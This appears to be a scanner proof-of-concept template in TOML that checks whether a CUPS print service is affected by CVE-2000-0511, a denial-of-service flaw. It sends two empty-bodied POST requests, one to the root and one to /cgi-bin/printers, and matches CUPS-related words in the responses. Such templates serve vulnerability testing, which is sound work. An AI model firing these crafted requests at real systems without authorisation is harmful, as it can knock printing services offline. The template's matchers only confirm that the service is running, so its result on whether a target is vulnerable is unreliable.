[info]
author = "AVE"
description = "检测目标CUPS服务是否存在CGI POST请求拒绝服务漏洞。通过向CUPS服务发送特制POST请求，验证服务是否响应，从而判断是否存在CVE-2000-0511漏洞"
id = "POC-AVE-2000-0574"
name = "CVE-2000-0511 CUPS CGI POST DoS PoC"
severity = "medium"
tags = [
    "cve-2000-0511",
    "cups",
    "dos",
]
vuln_id = [
    "CVE-2000-0511",
    "AVE-2000-0574",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
Content-Length = "0"
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "CUPS",
    "cupsd",
    "IPP",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/printers"
protocol = "http"

[poc.requests.headers]
Content-Length = "0"
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "CUPS",
    "cupsd",
    "IPP",
]
